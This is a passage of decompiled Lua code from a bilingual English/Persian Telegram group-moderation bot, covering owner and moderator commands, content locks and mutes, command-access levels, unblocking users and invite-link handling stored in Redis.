                      tdcli_function({ID = "GetUser", user_id_ = matches[2]}, action_by_id, {chat_id = (msg.to).id, user_id = matches[2], cmd = "setowner"})
                    end
                    if matches[2] and not (string.match)(matches[2], "^%d+$") then
                      tdcli_function({ID = "SearchPublicChat", username_ = matches[2]}, action_by_username, {chat_id = (msg.to).id, username = matches[2], cmd = "setowner"})
                    end
                  end
                  if (matches[1] == "remowner" or matches[1] == "حذف مالک") and is_owner(msg) then
                    if not matches[2] and msg.reply_id then
                      tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_id}, action_by_reply, {chat_id = (msg.to).id, cmd = "remowner"})
                    end
                    if matches[2] and (string.match)(matches[2], "^%d+$") then
                      tdcli_function({ID = "GetUser", user_id_ = matches[2]}, action_by_id, {chat_id = (msg.to).id, user_id = matches[2], cmd = "remowner"})
                    end
                    if matches[2] and not (string.match)(matches[2], "^%d+$") then
                      tdcli_function({ID = "SearchPublicChat", username_ = matches[2]}, action_by_username, {chat_id = (msg.to).id, username = matches[2], cmd = "remowner"})
                    end
                  end
                  if (matches[1] == "promote" or matches[1] == "ارتقا") and is_owner(msg) then
                    if not matches[2] and msg.reply_id then
                      tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_id}, action_by_reply, {chat_id = (msg.to).id, cmd = "promote"})
                    end
                    if matches[2] and (string.match)(matches[2], "^%d+$") then
                      tdcli_function({ID = "GetUser", user_id_ = matches[2]}, action_by_id, {chat_id = (msg.to).id, user_id = matches[2], cmd = "promote"})
                    end
                    if matches[2] and not (string.match)(matches[2], "^%d+$") then
                      tdcli_function({ID = "SearchPublicChat", username_ = matches[2]}, action_by_username, {chat_id = (msg.to).id, username = matches[2], cmd = "promote"})
                    end
                  end
                  if (matches[1] == "demote" or matches[1] == "تنزیل") and is_owner(msg) then
                    if not matches[2] and msg.reply_id then
                      tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_id}, action_by_reply, {chat_id = (msg.to).id, cmd = "demote"})
                    end
                    if matches[2] and (string.match)(matches[2], "^%d+$") then
                      tdcli_function({ID = "GetUser", user_id_ = matches[2]}, action_by_id, {chat_id = (msg.to).id, user_id = matches[2], cmd = "demote"})
                    end
                    if matches[2] and not (string.match)(matches[2], "^%d+$") then
                      tdcli_function({ID = "SearchPublicChat", username_ = matches[2]}, action_by_username, {chat_id = (msg.to).id, username = matches[2], cmd = "demote"})
                    end
                  end
                  if ((matches[1]):lower() == "maxchat" or matches[1] == "حداکثر چت") and is_owner(msg) then
                    currentChat = "currentChat:" .. (msg.to).id
                    mxRedis = "maxChat:" .. (msg.to).id
                    MaxChat = matches[2]
                    MaxChatSize = tonumber(MaxChat)
                    if MaxChatSize > 100 then
                      redis:set(currentChat, "0")
                      redis:set(mxRedis, MaxChat)
                      if not lang then
                        return "*Maxchat has been changed to:* `" .. MaxChat .. "`"
                      else
                        return "*تعداد حداکثري چت تغيير کرد به:* `" .. MaxChat .. "`"
                      end
                    else
                      if not lang then
                        return "*Your input should be more than* `100`"
                      else
                        return "*ورودی شما باید بیشتر از* `100` *باشد*"
                      end
                    end
                  end
                  if (matches[1] == "setlang" or matches[1] == "تغییر زبان") and is_owner(msg) then
                    if matches[2] == "en" or matches[2] == "انگلیسی" then
                      if (msg.to).type ~= "pv" then
                        redis:sadd("Bot(EN)Groups", (msg.to).id)
                        redis:srem("Bot(FA)Groups", (msg.to).id)
                      end
                      redis:del("gp_lang:" .. (msg.to).id)
                      return "*Language of this chat has been changed to* 🇬🇧"
                    else
                      if matches[2] == "fa" or matches[2] == "فارسی" then
                        if (msg.to).type ~= "pv" then
                          redis:sadd("Bot(FA)Groups", (msg.to).id)
                          redis:srem("Bot(EN)Groups", (msg.to).id)
                        end
                        redis:set("gp_lang:" .. (msg.to).id, true)
                        return "*زبان این گفتگو با موفقیت تغییر کرد به* 🇮🇷"
                      end
                    end
                  end
                  if (matches[1] == "lock" or matches[1] == "قفل") and is_mod(msg) then
                    if matches[2] == "link" or matches[2] == "لینک" then
                      if not redis:get("EditBot:lockandunlock") then
                        lock_item(msg, "link", "Link", "لینک", true)
                      else
                        lock_item2(msg, "link", "Link", "لینک", true)
                      end
                    else
                      if matches[2] == "tag" or matches[2] == "تگ" then
                        if not redis:get("EditBot:lockandunlock") then
                          lock_item(msg, "tag", "Tag", "تگ", true)
                        else
                          lock_item2(msg, "tag", "Tag", "تگ", true)
                        end
                      else
                        if matches[2] == "username" or matches[2] == "یوزرنیم" then
                          if not redis:get("EditBot:lockandunlock") then
                            lock_item(msg, "username", "UserName", "یوزرنیم", false)
                          else
                            lock_item2(msg, "username", "UserName", "یوزرنیم", false)
                          end
                        else
                          if matches[2] == "join" or matches[2] == "ورود" then
                            if not redis:get("EditBot:lockandunlock") then
                              lock_item(msg, "join", "Join", "ورود", false)
                            else
                              lock_item2(msg, "join", "Join", "ورود", false)
                            end
                          else
                            if matches[2] == "mention" or matches[2] == "منشن" then
                              if not redis:get("EditBot:lockandunlock") then
                                lock_item(msg, "mention", "Mention", "منشن", true)
                              else
                                lock_item2(msg, "mention", "Mention", "منشن", true)
                              end
                            else
                              if matches[2] == "arabic" or matches[2] == "عربی" then
                                if not redis:get("EditBot:lockandunlock") then
                                  lock_item(msg, "arabic", "Arabic", "عربی", false)
                                else
                                  lock_item2(msg, "arabic", "Arabic", "عربی", false)
                                end
                              else
                                if matches[2] == "edit" or matches[2] == "ادیت" then
                                  if not redis:get("EditBot:lockandunlock") then
                                    lock_item(msg, "edit", "Edit", "ادیت", false)
                                  else
                                    lock_item2(msg, "edit", "Edit", "ادیت", false)
                                  end
                                else
                                  if matches[2] == "spam" or matches[2] == "اسپم" then
                                    if not redis:get("EditBot:lockandunlock") then
                                      lock_item(msg, "spam", "Spam", "اسپم", false)
                                    else
                                      lock_item2(msg, "spam", "Spam", "اسپم", false)
                                    end
                                  else
                                    if matches[2] == "flood" or matches[2] == "پیام رگباری" then
                                      if not redis:get("EditBot:lockandunlock") then
                                        lock_item(msg, "flood", "Flood", "پیام رگباری", false)
                                      else
                                        lock_item2(msg, "flood", "Flood", "پیام رگباری", false)
                                      end
                                    else
                                      if matches[2] == "bots" or matches[2] == "ربات ها" then
                                        if not redis:get("EditBot:lockandunlock") then
                                          lock_item(msg, "bots", "Bots", "ربات ها", false)
                                        else
                                          lock_item2(msg, "bots", "Bots", "ربات ها", false)
                                        end
                                      else
                                        if matches[2] == "markdown" or matches[2] == "فونت" then
                                          if not redis:get("EditBot:lockandunlock") then
                                            lock_item(msg, "markdown", "Markdown", "فونت", false)
                                          else
                                            lock_item2(msg, "markdown", "Markdown", "فونت", false)
                                          end
                                        else
                                          if matches[2] == "webpage" or matches[2] == "صفحات وب" then
                                            if not redis:get("EditBot:lockandunlock") then
                                              lock_item(msg, "webpage", "Webpage", "صفحات وب", false)
                                            else
                                              lock_item2(msg, "webpage", "Webpage", "صفحات وب", false)
                                            end
                                          else
                                            if matches[2] == "pin" or matches[2] == "پین" then
                                              if not redis:get("EditBot:lockandunlock") then
                                                lock_item(msg, "pin", "Pin", "پین", false)
                                              else
                                                lock_item2(msg, "pin", "Pin", "پین", false)
                                              end
                                            else
                                              if matches[2] == "maxwords" or matches[2] == "حداکثر کلمات" then
                                                if not redis:get("EditBot:lockandunlock") then
                                                  lock_item(msg, "MaxWords", "MaxWords", "حداکثر کلمات", false)
                                                else
                                                  lock_item2(msg, "MaxWords", "MaxWords", "حداکثر کلمات", false)
                                                end
                                              else
                                                if matches[2] == "botchat" or matches[2] == "چت ربات" then
                                                  if not redis:get("EditBot:lockandunlock") then
                                                    lock_item(msg, "BotChat", "BotChat", "چت ربات", false)
                                                  else
                                                    lock_item2(msg, "BotChat", "BotChat", "چت ربات", false)
                                                  end
                                                else
                                                  if matches[2] == "fohsh" or matches[2] == "فحش" then
                                                    if not redis:get("EditBot:lockandunlock") then
                                                      lock_item(msg, "fohsh", "Fohsh", "فحش", false)
                                                    else
                                                      lock_item2(msg, "fohsh", "Fohsh", "فحش", false)
                                                    end
                                                  else
                                                    if matches[2] == "english" or matches[2] == "انگلیسی" then
                                                      if not redis:get("EditBot:lockandunlock") then
                                                        lock_item(msg, "english", "English", "انگلیسی", false)
                                                      else
                                                        lock_item2(msg, "english", "English", "انگلیسی", false)
                                                      end
                                                    else
                                                      if matches[2] == "forcedinvite" or matches[2] == "forced invite" or matches[2] == "دعوت اجباری" then
                                                        if not redis:get("EditBot:lockandunlock") then
                                                          lock_item(msg, "forcedinvite", "Forced invite", "دعوت اجباری", false)
                                                        else
                                                          lock_item2(msg, "forcedinvite", "Forced invite", "دعوت اجباری", false)
                                                        end
                                                      else
                                                        if matches[2] == "cmds" or matches[2] == "دستورات" then
                                                          if not redis:get("EditBot:lockandunlock") then
                                                            if redis:get("GroupCmdsAccess:" .. (msg.to).id) then
                                                              redis:del("GroupCmdsAccess:" .. (msg.to).id)
                                                              if lang then
                                                                return "دستور به ربات برای کاربران عادی باز شد"
                                                              else
                                                                return "*Cmds Has Been Unlocked For Members*"
                                                              end
                                                            else
                                                              redis:set("GroupCmdsAccess:" .. (msg.to).id, "moderator")
                                                              if lang then
                                                                return "دستور به ربات برای کاربران عادی قفل شد"
                                                              else
                                                                return "*Cmds Has Been Locked For Members*"
                                                              end
                                                            end
                                                          else
                                                            if redis:get("GroupCmdsAccess:" .. (msg.to).id) then
                                                              if lang then
                                                                return "دستور به ربات برای کاربران عادی از قبل قفل بود"
                                                              else
                                                                return "*Cmds is Already Locked For Members*"
                                                              end
                                                            else
                                                              redis:set("GroupCmdsAccess:" .. (msg.to).id, "moderator")
                                                              if lang then
                                                                return "دستور به ربات برای کاربران عادی قفل شد"
                                                              else
                                                                return "*Cmds Has Been Locked For Members*"
                                                              end
                                                            end
                                                          end
                                                        else
                                                          if matches[2] == "all" or matches[2] == "همه" then
                                                            if not redis:get("EditBot:lockandunlock") then
                                                              mute_item(msg, "all", "All", "همه", true)
                                                            else
                                                              mute_item2(msg, "all", "All", "همه", true)
                                                            end
                                                          else
                                                            if matches[2] == "gif" or matches[2] == "گیف" then
                                                              if not redis:get("EditBot:lockandunlock") then
                                                                mute_item(msg, "gif", "Gif", "گیف", true)
                                                              else
                                                                mute_item2(msg, "gif", "Gif", "گیف", true)
                                                              end
                                                            else
                                                              if matches[2] == "text" or matches[2] == "متن" then
                                                                if not redis:get("EditBot:lockandunlock") then
                                                                  mute_item(msg, "text", "Text", "متن", false)
                                                                else
                                                                  mute_item2(msg, "text", "Text", "متن", false)
                                                                end
                                                              else
                                                                if matches[2] == "photo" or matches[2] == "عکس" then
                                                                  if not redis:get("EditBot:lockandunlock") then
                                                                    mute_item(msg, "photo", "Photo", "عکس", true)
                                                                  else
                                                                    mute_item2(msg, "photo", "Photo", "عکس", true)
                                                                  end
                                                                else
                                                                  if matches[2] == "video" or matches[2] == "فیلم" then
                                                                    if not redis:get("EditBot:lockandunlock") then
                                                                      mute_item(msg, "video", "Video", "فیلم", true)
                                                                    else
                                                                      mute_item2(msg, "video", "Video", "فیلم", true)
                                                                    end
                                                                  else
                                                                    if matches[2] == "audio" or matches[2] == "آهنگ" then
                                                                      if not redis:get("EditBot:lockandunlock") then
                                                                        mute_item(msg, "audio", "Audio", "آهنگ", true)
                                                                      else
                                                                        mute_item2(msg, "audio", "Audio", "آهنگ", true)
                                                                      end
                                                                    else
                                                                      if matches[2] == "voice" or matches[2] == "صدا" or matches[2] == "صدا" then
                                                                        if not redis:get("EditBot:lockandunlock") then
                                                                          mute_item(msg, "voice", "Voice", "صدا", true)
                                                                        else
                                                                          mute_item2(msg, "voice", "Voice", "صدا", true)
                                                                        end
                                                                      else
                                                                        if matches[2] == "sticker" or matches[2] == "استیکر" then
                                                                          if not redis:get("EditBot:lockandunlock") then
                                                                            mute_item(msg, "sticker", "Sticker", "استیکر", true)
                                                                          else
                                                                            mute_item2(msg, "sticker", "Sticker", "استیکر", true)
                                                                          end
                                                                        else
                                                                          if matches[2] == "contact" or matches[2] == "مخاطب" then
                                                                            if not redis:get("EditBot:lockandunlock") then
                                                                              mute_item(msg, "contact", "Contact", "مخاطب", true)
                                                                            else
                                                                              mute_item2(msg, "contact", "Contact", "مخاطب", true)
                                                                            end
                                                                          else
                                                                            if matches[2] == "forward" or matches[2] == "فوروارد" then
                                                                              if not redis:get("EditBot:lockandunlock") then
                                                                                mute_item(msg, "forward", "Forward", "فوروارد", true)
                                                                              else
                                                                                mute_item2(msg, "forward", "Forward", "فوروارد", true)
                                                                              end
                                                                            else
                                                                              if matches[2] == "location" or matches[2] == "مکان" then
                                                                                if not redis:get("EditBot:lockandunlock") then
                                                                                  mute_item(msg, "location", "Location", "مکان", true)
                                                                                else
                                                                                  mute_item2(msg, "location", "Location", "مکان", true)
                                                                                end
                                                                              else
                                                                                if matches[2] == "document" or matches[2] == "فایل" then
                                                                                  if not redis:get("EditBot:lockandunlock") then
                                                                                    mute_item(msg, "document", "Document", "فایل", true)
                                                                                  else
                                                                                    mute_item2(msg, "document", "Document", "فایل", true)
                                                                                  end
                                                                                else
                                                                                  if matches[2] == "tgservice" or matches[2] == "خدمات تلگرام" then
                                                                                    if not redis:get("EditBot:lockandunlock") then
                                                                                      mute_item(msg, "tgservice", "Tgservice", "خدمات تلگرام", false)
                                                                                    else
                                                                                      mute_item2(msg, "tgservice", "Tgservice", "خدمات تلگرام", false)
                                                                                    end
                                                                                  else
                                                                                    if matches[2] == "inline" or matches[2] == "اینلاین" then
                                                                                      if not redis:get("EditBot:lockandunlock") then
                                                                                        mute_item(msg, "inline", "Inline", "اینلاین", true)
                                                                                      else
                                                                                        mute_item2(msg, "inline", "Inline", "اینلاین", true)
                                                                                      end
                                                                                    else
                                                                                      if matches[2] == "game" or matches[2] == "بازی" or matches[2] == "بازی های آنلاین" then
                                                                                        if not redis:get("EditBot:lockandunlock") then
                                                                                          mute_item(msg, "game", "Game", "بازی های آنلاین", true)
                                                                                        else
                                                                                          mute_item2(msg, "game", "Game", "بازی های آنلاین", true)
                                                                                        end
                                                                                      else
                                                                                        if matches[2] == "keyboard" or matches[2] == "کیبورد" or matches[2] == "صفحه کلید" then
                                                                                          if not redis:get("EditBot:lockandunlock") then
                                                                                            mute_item(msg, "keyboard", "Keyboard", "کیبورد", true)
                                                                                          else
                                                                                            mute_item2(msg, "keyboard", "Keyboard", "کیبورد", true)
                                                                                          end
                                                                                        else
                                                                                          if not redis:get("EditBot:lockandunlock") then
                                                                                            _ENV.Locks = redis:smembers("GroupAddSettings:" .. (msg.to).id)
                                                                                            _ENV.Items = redis:smembers("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. matches[2])
                                                                                            if #_ENV.Items ~= 0 and redis:sismember("GroupAddSettings:" .. (msg.to).id, matches[2]) then
                                                                                              if not redis:get("AppliedAddSettings:" .. (msg.to).id .. ":" .. matches[2]) then
                                                                                                redis:set("AppliedAddSettings:" .. (msg.to).id .. ":" .. matches[2], true)
                                                                                                for k,v in (_ENV.pairs)(_ENV.Items) do
                                                                                                  redis:hset("GroupSettings:" .. (msg.to).id, v, "yes")
                                                                                                end
                                                                                                if not lang then
                                                                                                  return "*Private Lock:* `" .. matches[2] .. "` \n*Status:* `Enabled`"
                                                                                                else
                                                                                                  return "قفل خصوصی: `" .. matches[2] .. "` \nوضعیت: `فعال شد`"
                                                                                                end
                                                                                              else
                                                                                                redis:del("AppliedAddSettings:" .. (msg.to).id .. ":" .. matches[2])
                                                                                                for k,v in (_ENV.pairs)(_ENV.Items) do
                                                                                                  redis:hdel("GroupSettings:" .. (msg.to).id, v)
                                                                                                end
                                                                                                if not lang then
                                                                                                  return "*Private Lock:* `" .. matches[2] .. "` \n*Status:* `Disabled`"
                                                                                                else
                                                                                                  return "قفل خصوصی: `" .. matches[2] .. "` \nوضعیت: `غیر فعال شد`"
                                                                                                end
                                                                                              end
                                                                                            end
                                                                                          else
                                                                                            _ENV.Locks = redis:smembers("GroupAddSettings:" .. (msg.to).id)
                                                                                            _ENV.Items = redis:smembers("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. matches[2])
                                                                                            if #_ENV.Items ~= 0 and redis:sismember("GroupAddSettings:" .. (msg.to).id, matches[2]) then
                                                                                              if not redis:get("AppliedAddSettings:" .. (msg.to).id .. ":" .. matches[2]) then
                                                                                                redis:set("AppliedAddSettings:" .. (msg.to).id .. ":" .. matches[2], true)
                                                                                                for k,v in (_ENV.pairs)(_ENV.Items) do
                                                                                                  redis:hset("GroupSettings:" .. (msg.to).id, v, "yes")
                                                                                                end
                                                                                                if not lang then
                                                                                                  return "*Private Lock:* `" .. matches[2] .. "` \n*Status:* `Enabled`"
                                                                                                else
                                                                                                  return "قفل خصوصی: `" .. matches[2] .. "` \nوضعیت: `فعال شد`"
                                                                                                end
                                                                                              else
                                                                                                if not lang then
                                                                                                  return "*Private Lock:* `" .. matches[2] .. "` \n*Status:* `Already Enabled`"
                                                                                                else
                                                                                                  return "قفل خصوصی: `" .. matches[2] .. "` \nوضعیت: `از قبل فعال بود`"
                                                                                                end
                                                                                              end
                                                                                            end
                                                                                          end
                                                                                        end
                                                                                      end
                                                                                    end
                                                                                  end
                                                                                end
                                                                              end
                                                                            end
                                                                          end
                                                                        end
                                                                      end
                                                                    end
                                                                  end
                                                                end
                                                              end
                                                            end
                                                          end
                                                        end
                                                      end
                                                    end
                                                  end
                                                end
                                              end
                                            end
                                          end
                                        end
                                      end
                                    end
                                  end
                                end
                              end
                            end
                          end
                        end
                      end
                    end
                  end
                  if (matches[1] == "unlock" or matches[1] == "باز کردن") and is_mod(msg) and redis:get("EditBot:lockandunlock") then
                    if matches[2] == "link" or matches[2] == "لینک" then
                      unlock_item(msg, "link", "Link", "لینک", true)
                    else
                      if matches[2] == "tag" or matches[2] == "تگ" then
                        unlock_item(msg, "tag", "Tag", "تگ", true)
                      else
                        if matches[2] == "username" or matches[2] == "یوزرنیم" then
                          unlock_item(msg, "username", "UserName", "یوزرنیم", false)
                        else
                          if matches[2] == "join" or matches[2] == "ورود" then
                            unlock_item(msg, "join", "Join", "ورود", false)
                          else
                            if matches[2] == "mention" or matches[2] == "منشن" then
                              unlock_item(msg, "mention", "Mention", "منشن", true)
                            else
                              if matches[2] == "arabic" or matches[2] == "عربی" then
                                unlock_item(msg, "arabic", "Arabic", "عربی", false)
                              else
                                if matches[2] == "edit" or matches[2] == "ادیت" then
                                  unlock_item(msg, "edit", "Edit", "ادیت", false)
                                else
                                  if matches[2] == "spam" or matches[2] == "اسپم" then
                                    unlock_item(msg, "spam", "Spam", "اسپم", false)
                                  else
                                    if matches[2] == "flood" or matches[2] == "پیام رگباری" then
                                      unlock_item(msg, "flood", "Flood", "پیام رگباری", false)
                                    else
                                      if matches[2] == "bots" or matches[2] == "ربات ها" then
                                        unlock_item(msg, "bots", "Bots", "ربات ها", false)
                                      else
                                        if matches[2] == "markdown" or matches[2] == "فونت" then
                                          unlock_item(msg, "markdown", "Markdown", "فونت", false)
                                        else
                                          if matches[2] == "webpage" or matches[2] == "صفحات وب" then
                                            unlock_item(msg, "webpage", "Webpage", "صفحات وب", false)
                                          else
                                            if matches[2] == "pin" or matches[2] == "پین" then
                                              unlock_item(msg, "pin", "Pin", "پین", false)
                                            else
                                              if matches[2] == "maxwords" or matches[2] == "حداکثر کلمات" then
                                                unlock_item(msg, "MaxWords", "MaxWords", "حداکثر کلمات", false)
                                              else
                                                if matches[2] == "botchat" or matches[2] == "چت ربات" then
                                                  unlock_item(msg, "BotChat", "BotChat", "چت ربات", false)
                                                else
                                                  if matches[2] == "fohsh" or matches[2] == "فحش" then
                                                    unlock_item(msg, "fohsh", "Fohsh", "فحش", false)
                                                  else
                                                    if matches[2] == "english" or matches[2] == "انگلیسی" then
                                                      unlock_item(msg, "english", "English", "انگلیسی", false)
                                                    else
                                                      if matches[2] == "forcedinvite" or matches[2] == "forced invite" or matches[2] == "دعوت اجباری" then
                                                        unlock_item(msg, "forcedinvite", "Forced invite", "دعوت اجباری", false)
                                                      else
                                                        if matches[2] == "cmds" or matches[2] == "دستورات" then
                                                          if redis:get("GroupCmdsAccess:" .. (msg.to).id) then
                                                            redis:del("GroupCmdsAccess:" .. (msg.to).id)
                                                            if lang then
                                                              return "دستور به ربات برای کاربران عادی باز شد"
                                                            else
                                                              return "*Cmds Has Been Unlocked For Members*"
                                                            end
                                                          else
                                                            if lang then
                                                              return "دستور به ربات برای کاربران عادی از قبل باز بود"
                                                            else
                                                              return "*Cmds is Already Unlocked For Members*"
                                                            end
                                                          end
                                                        else
                                                          if matches[2] == "all" or matches[2] == "همه" then
                                                            unmute_item(msg, "all", "All", "همه", true)
                                                          else
                                                            if matches[2] == "gif" or matches[2] == "گیف" then
                                                              unmute_item(msg, "gif", "Gif", "گیف", true)
                                                            else
                                                              if matches[2] == "text" or matches[2] == "متن" then
                                                                unmute_item(msg, "text", "Text", "متن", false)
                                                              else
                                                                if matches[2] == "photo" or matches[2] == "عکس" then
                                                                  unmute_item(msg, "photo", "Photo", "عکس", true)
                                                                else
                                                                  if matches[2] == "video" or matches[2] == "فیلم" then
                                                                    unmute_item(msg, "video", "Video", "فیلم", true)
                                                                  else
                                                                    if matches[2] == "audio" or matches[2] == "آهنگ" then
                                                                      unmute_item(msg, "audio", "Audio", "آهنگ", true)
                                                                    else
                                                                      if matches[2] == "voice" or matches[2] == "صدا" or matches[2] == "صدا" then
                                                                        unmute_item(msg, "voice", "Voice", "صدا", true)
                                                                      else
                                                                        if matches[2] == "sticker" or matches[2] == "استیکر" then
                                                                          unmute_item(msg, "sticker", "Sticker", "استیکر", true)
                                                                        else
                                                                          if matches[2] == "contact" or matches[2] == "مخاطب" then
                                                                            unmute_item(msg, "contact", "Contact", "مخاطب", true)
                                                                          else
                                                                            if matches[2] == "forward" or matches[2] == "فوروارد" then
                                                                              unmute_item(msg, "forward", "Forward", "فوروارد", true)
                                                                            else
                                                                              if matches[2] == "location" or matches[2] == "مکان" then
                                                                                unmute_item(msg, "location", "Location", "مکان", true)
                                                                              else
                                                                                if matches[2] == "document" or matches[2] == "فایل" then
                                                                                  unmute_item(msg, "document", "Document", "فایل", true)
                                                                                else
                                                                                  if matches[2] == "tgservice" or matches[2] == "خدمات تلگرام" then
                                                                                    unmute_item(msg, "tgservice", "Tgservice", "خدمات تلگرام", false)
                                                                                  else
                                                                                    if matches[2] == "inline" or matches[2] == "اینلاین" then
                                                                                      unmute_item(msg, "inline", "Inline", "اینلاین", true)
                                                                                    else
                                                                                      if matches[2] == "game" or matches[2] == "بازی" or matches[2] == "بازی های آنلاین" then
                                                                                        unmute_item(msg, "game", "Game", "بازی های آنلاین", true)
                                                                                      else
                                                                                        if matches[2] == "keyboard" or matches[2] == "کیبورد" or matches[2] == "صفحه کلید" then
                                                                                          unmute_item(msg, "keyboard", "Keyboard", "کیبورد", true)
                                                                                        else
                                                                                          _ENV.Locks = redis:smembers("GroupAddSettings:" .. (msg.to).id)
                                                                                          _ENV.Items = redis:smembers("GroupAddSettingsItem:" .. (msg.to).id .. ":" .. matches[2])
                                                                                          if #_ENV.Items ~= 0 and redis:sismember("GroupAddSettings:" .. (msg.to).id, matches[2]) then
                                                                                            if redis:get("AppliedAddSettings:" .. (msg.to).id .. ":" .. matches[2]) then
                                                                                              redis:del("AppliedAddSettings:" .. (msg.to).id .. ":" .. matches[2])
                                                                                              for k,v in (_ENV.pairs)(_ENV.Items) do
                                                                                                redis:hdel("GroupSettings:" .. (msg.to).id, v)
                                                                                              end
                                                                                              if not lang then
                                                                                                return "*Private Lock:* `" .. matches[2] .. "` \n*Status:* `Disabled`"
                                                                                              else
                                                                                                return "قفل خصوصی: `" .. matches[2] .. "` \nوضعیت: `غیر فعال شد`"
                                                                                              end
                                                                                            else
                                                                                              if not lang then
                                                                                                return "*Private Lock:* `" .. matches[2] .. "` \n*Status:* `Already Disabled`"
                                                                                              else
                                                                                                return "قفل خصوصی: `" .. matches[2] .. "` \nوضعیت: `از قبل غیر فعال بود`"
                                                                                              end
                                                                                            end
                                                                                          end
                                                                                        end
                                                                                      end
                                                                                    end
                                                                                  end
                                                                                end
                                                                              end
                                                                            end
                                                                          end
                                                                        end
                                                                      end
                                                                    end
                                                                  end
                                                                end
                                                              end
                                                            end
                                                          end
                                                        end
                                                      end
                                                    end
                                                  end
                                                end
                                              end
                                            end
                                          end
                                        end
                                      end
                                    end
                                  end
                                end
                              end
                            end
                          end
                        end
                      end
                    end
                  end
                  if ((matches[1]):lower() == "access" or matches[1] == "دسترسی") and is_owner(msg) then
                    if (matches[2]):lower() == "owner" or matches[2] == "مالک" then
                      redis:set("GroupCmdsAccess:" .. (msg.to).id, "owner")
                      if lang then
                        return "دسترسی دستورات به `مالک` یا بالاتر تغییر کرد"
                      else
                        return "*Commands Access Changed To* `owner` *or Higher*"
                      end
                    end
                    if (matches[2]):lower() == "moderator" or matches[2] == "مدیر" then
                      redis:set("GroupCmdsAccess:" .. (msg.to).id, "moderator")
                      if lang then
                        return "دسترسی دستورات به `مدیر` و بالاتر تغییر کرد"
                      else
                        return "*Commands Access Changed To* `moderator` *or Higher*"
                      end
                    end
                    if (matches[2]):lower() == "member" or matches[2] == "ممبر" then
                      redis:del("GroupCmdsAccess:" .. (msg.to).id)
                      if lang then
                        return "دسترسی دستورات برای `همه اعضا` آزاد شد"
                      else
                        return "*Commands Access Changed To* `member` *or Higher*"
                      end
                    end
                  end
                  if (matches[1] == "unblock" or matches[1] == "آزاد سازی") and is_owner(msg) and matches[2] then
                    if (matches[2]):match("(%d+)") then
                      local UnBlock = function(arg, data)
    -- function num : 0_56_1 , upvalues : _ENV
    (tdcli.changeChatMemberStatus)(arg.chat_id, arg.UserID, "Left", dl_cb, nil)
  end

                      ;
                      (tdcli.getChannelMembers)((msg.to).id, 0, "Kicked", 1, UnBlock, {chat_id = (msg.to).id, UserID = tonumber(matches[2])})
                      if not lang then
                        return "*User* `" .. matches[2] .. "` *Unblocked From Block List!*"
                      else
                        return "کاربر `" .. matches[2] .. "` از لیست مسدودی گروه آزاد شد!"
                      end
                    else
                      do
                        if (matches[2]):match("^@") then
                          local UnBlock = function(arg, data)
    -- function num : 0_56_2 , upvalues : _ENV
    (tdcli.changeChatMemberStatus)(arg.chat_id, arg.UserID, "Left", dl_cb, nil)
  end

                          local GetIDForUnblock = function(arg, data)
    -- function num : 0_56_3 , upvalues : _ENV, UnBlock, lang
    if data.id_ then
      (tdcli.getChannelMembers)(arg.chat_id, 0, "Kicked", 1, UnBlock, {chat_id = arg.chat_id, UserID = data.id_})
      if not lang then
        (tdcli.sendMessage)(arg.chat_id, arg.msg_id, 0, "*User* (`" .. data.id_ .. "`) *Unblocked From Block List!*", 1, "md")
      else
        ;
        (tdcli.sendMessage)(arg.chat_id, arg.msg_id, 0, "کاربر (`" .. data.id_ .. "`) از لیست مسدودی گروه آزاد شد!", 1, "md")
      end
    else
      if not lang then
        (tdcli.sendMessage)(arg.chat_id, arg.msg_id, 0, "`User Not Found!`", 1, "md")
      else
        ;
        (tdcli.sendMessage)(arg.chat_id, arg.msg_id, 0, "`کاربر پیدا نشد!`", 1, "md")
      end
    end
  end

                          tdcli_function({ID = "SearchPublicChat", username_ = matches[2]}, GetIDForUnblock, {chat_id = (msg.to).id, msg_id = msg.id})
                        end
                        do
                          do
                            if (matches[1] == "newlink" or matches[1] == "لینک جدید") and is_mod(msg) and not matches[2] then
                              local callback_link = function(arg, data)
    -- function num : 0_56_4 , upvalues : msg, _ENV
    local hash = "gp_lang:" .. (msg.to).id
    local lang = redis:get(hash)
    if not data.invite_link_ then
      if not lang then
        return (tdcli.sendMessage)((msg.to).id, msg.id, 1, "*Error!* Please Set Link With `/setlink`", 1, "md")
      else
        if lang then
          return (tdcli.sendMessage)((msg.to).id, msg.id, 1, "خطا! لطفا لینک را با دستور `/setlink` تنظیم کنید", 1, "md")
        end
      end
    else
      redis:hset("GroupSettings:" .. (msg.to).id, "GroupLink", data.invite_link_)
      if not lang then
        return (tdcli.sendMessage)((msg.to).id, msg.id, 1, "`New Link Created`", 1, "md")
      else
        if lang then
          return (tdcli.sendMessage)((msg.to).id, msg.id, 1, "`لینک جدید ساخته شد`", 1, "md")
        end
      end
    end
  end

                              ;
                              (tdcli.exportChatInviteLink)((msg.to).id, callback_link, nil)
                            end
                            do
                              if (matches[1] == "newlink" or matches[1] == "لینک جدید") and is_mod(msg) and matches[2] == "pv" then
                                local callback_link = function(arg, data)
    -- function num : 0_56_5 , upvalues : msg, _ENV, user
    local result = data.invite_link_
    local hash = "gp_lang:" .. (msg.to).id
    local lang = redis:get(hash)
    if not result then
      if not lang then
        return (tdcli.sendMessage)((msg.to).id, msg.id, 1, "*Error!* Please Set Link With `/setlink`", 1, "md")
      else
        if lang then
          return (tdcli.sendMessage)((msg.to).id, msg.id, 1, "خطا! لطفا لینک را با دستور `/setlink` تنظیم کنید", 1, "md")
        end
      end
    else
      redis:hset("GroupSettings:" .. (msg.to).id, "GroupLink", result)
      if not lang then
        (tdcli.sendMessage)(user, msg.id, 1, "New Link `" .. (msg.to).id .. "`\n> " .. result, 1, "md")
      else
        if lang then
          (tdcli.sendMessage)(user, msg.id, 1, "لینک جدید گروه `" .. (msg.to).id .. "`\n> " .. result, 1, "md")
        end
      end
    end
  end

                                ;
                                (tdcli.exportChatInviteLink)((msg.to).id, callback_link, nil)
                              end
                              if (matches[1] == "setlink" or matches[1] == "تنظیم لینک") and is_owner(msg) then
                                if not matches[2] then
                                  redis:hset("GroupSettings:" .. (msg.to).id, "GroupLink", "waiting")
                                  if not lang then
                                    return "`Please Send Link:`"
                                  else
                                    return "`لطفا لینک را ارسال کنید:`"
                                  end
                                end
